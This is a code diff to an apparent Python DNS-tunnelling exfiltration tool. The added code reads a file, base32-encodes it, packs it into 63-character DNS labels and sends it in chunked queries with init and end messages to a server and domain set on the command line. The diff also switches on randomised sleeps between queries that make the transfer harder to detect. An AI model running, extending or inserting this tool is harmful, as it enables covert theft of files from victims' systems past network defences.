@@ -10,11 +10,10 @@ import signal
 import threading
 import time
 import random
+import tempfile
 import base64
 import socket
 from utils import *
-
-from io import StringIO
 
 MIN_TIME_SLEEP = None
 MAX_TIME_SLEEP = None
@@ -28,47 +27,82 @@ class FileExfiltrator(threading.Thread):
         self.domain = args.domain
         self.address, self.port = args.socket.split(':')
         self.sessionid = str(uuid.uuid4())[:8].upper()
+        self.total_chunks = None
         self.checksum = ''
         self.max_attempts = 5
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.sock.settimeout(2)
 
+    def divide_in_labels(self, data_chunk):
+        # Divide data into labels of up to 63 characters
+        labels = [data_chunk[i:i + 63] for i in range(0, len(data_chunk), 63)]
+        return labels
+
     def run(self):
 
-        # Check if the file exists
-        #if not os.path.exists(self.file_to_send):
-            #print(f"File '{self.file_to_send}' does not exist. Aborting")
-            #return
-
         try:
+            # Verify if the file exists
+            if not os.path.exists(self.file_to_send):
+                raise FileNotFoundError(f"Error: File {self.file_to_send} not found.")
+
+            # Verify if the file is empty
+            # For info: if file empty, mad5 hash is d41d8cd98f00b204e9800998ecf8427e
+            if os.path.getsize(self.file_to_send) == 0:
+                raise ValueError(f"Error: File {self.file_to_send} is empty.")
+
+            # If the file exists and is not empty, compute the MD5 hash
             with open(self.file_to_send, 'rb') as f:
                 self.checksum = md5(f)
-                # if file empty, mad5 hash is d41d8cd98f00b204e9800998ecf8427e
-                #print(self.checksum)
+                print(f"MD5 Hash: {self.checksum}")
 
-        except FileNotFoundError:
-            print(f"Error: File {self.file_to_send} not found.")
-            return
+                f.seek(0)
+
+                file_data = f.read()
+                encoded_file_data = encode_base32(file_data)
+                #print(f"File content encoded in base32 : {encoded_file_data}")
+
+        except FileNotFoundError as e:
+            print(e)
+            sys.exit(1)
+        except ValueError as e:
+            print(e)
+            sys.exit(1)
         except Exception as e:
             print(f"Error: {e}")
+            sys.exit(1)
 
-        data = ['init',str(os.path.basename(self.file_to_send)),'1',str(self.checksum)]
-        request = f"{self.sessionid}"
+        temp_file = tempfile.SpooledTemporaryFile()
+    
+        temp_file.write(encoded_file_data.encode('utf-8'))
+        temp_file.seek(0) # Return to beginning of temporary file
+        
+        file_size = len(temp_file.read())
+        temp_file.seek(0)
+
+        # Compute the total number of chunks to be sent by dividing the file size by the number of data items sent per request. 
+        # We add 126 to ensure that the last chunk, which might be smaller than 126 bytes, is taken into account.
+        #self.total_chunks = (file_size + 126 - 1) // 126
+        #print(self.total_chunks)
+
+
+        # Send the initialization request
+        #data = ['init',str(os.path.basename(self.file_to_send)),str(self.total_chunks),str(self.checksum)]
+        data = ['init',str(os.path.basename(self.file_to_send)),str(self.checksum)]
+        qname = f"{self.sessionid}"
         for element in data:
             # Convertir la chaîne en une séquence d'octets (UTF-8 est couramment utilisé)
             binary_data = element.encode('utf-8')
             # Encoder en base32
             encoded_element = base64.b32encode(binary_data).decode('utf-8').rstrip('=')
-            request += '.' + encoded_element
-        request = request + '.' + str(self.domain)   
-        
-        #print(request)
+            qname += '.' + encoded_element
+        qname = qname + '.' + str(self.domain)   
+        print(qname)
 
-        q = dnslib.DNSRecord.question(request)
+        query = dnslib.DNSRecord.question(qname)
 
         #q.send(self.address, int(self.port), timeout=1)
-        self.sock.sendto(q.pack(), (self.address, int(self.port)))
+        self.sock.sendto(query.pack(), (self.address, int(self.port)))
 
         try:
             response, _ = self.sock.recvfrom(1024)
@@ -81,21 +115,77 @@ class FileExfiltrator(threading.Thread):
         reply = dnslib.DNSRecord.parse(response)
         #print(f"Received DNS response: {reply}")
 
-        # Vérifier si le domaine de la réponse est égal à la requête
-        if reply.questions[0].qname == dnslib.DNSLabel(request) and reply.header.rcode != dnslib.RCODE.SERVFAIL:
-            print("Le domaine de la réponse est égal à la requête.")
-            # Ajoutez ici le code que vous souhaitez exécuter lorsque le domaine de la réponse est égal à la requête.
+        # Check if the response domain is equal to the request
+        if reply.questions[0].qname == dnslib.DNSLabel(qname) and reply.header.rcode != dnslib.RCODE.SERVFAIL:
+            print("The response domain is equal to the query.")
+
         else:
             print("Server failed")
+
+        
+        # Start sending file
+
+        
+        
+        chunk_index = 0
+        while True:
+            # Pattern: [sessionID].[chunk_index]. [...] .[domain]
+            fixed_parts_size = len(self.sessionid) + len(str(chunk_index)) + len(self.domain) + 3
+
+            remaining_size = 253 - fixed_parts_size
+            #print(remaining_size)
+            points = (remaining_size-1) // 63
+            #print(points)
+
+            data_chunk = temp_file.read(remaining_size - points).decode('utf-8')
+            if not data_chunk:
+                break
+
+            #if len(data_chunk) <= 63:
+            #    qname = f"{self.sessionid}.{chunk_index}.{str(data_chunk)}.{self.domain}"
+            #else:
+            #    qname = f"{self.sessionid}.{chunk_index}.{str(data_chunk[:63])}.{str(data_chunk[63:])}.{self.domain}"
+
+            labels = self.divide_in_labels(data_chunk)
+            qname = f"{self.sessionid}.{chunk_index}." + ".".join(labels) + f".{self.domain}"
+            
+            print(qname)
+
+            query = dnslib.DNSRecord.question(qname)
+
+            self.sock.sendto(query.pack(), (self.address, int(self.port)))
+
+            #print(data)
         
 
-        #time_to_sleep = random.uniform(MIN_TIME_SLEEP, MAX_TIME_SLEEP)
-        #print(f"Sleeping for {time_to_sleep} seconds")
-        #time.sleep(time_to_sleep)
+            time_to_sleep = random.uniform(MIN_TIME_SLEEP, MAX_TIME_SLEEP)
+            print(f"Sleeping for {time_to_sleep} seconds")
+            time.sleep(time_to_sleep)
+            chunk_index = chunk_index + 1
+
+        # Send end request
+        data = ['end']
+        qname = f"{self.sessionid}.{chunk_index}"
+        for element in data:
+            # Convertir la chaîne en une séquence d'octets (UTF-8 est couramment utilisé)
+            binary_data = element.encode('utf-8')
+            # Encoder en base32
+            encoded_element = base64.b32encode(binary_data).decode('utf-8').rstrip('=')
+            qname += '.' + encoded_element
+        qname = qname + '.' + str(self.domain)
+        print(qname)
+
+        query = dnslib.DNSRecord.question(qname)
+
+        #q.send(self.address, int(self.port), timeout=1)
+        self.sock.sendto(query.pack(), (self.address, int(self.port)))
 
         #while True:
             #print("Thread for file {} is running...".format(self.file_to_send))
             #time.sleep(1)  # Simulate a long task
+
+        temp_file.close()
+        sys.exit(0)
 
 
 def signal_handler(sig, frame):
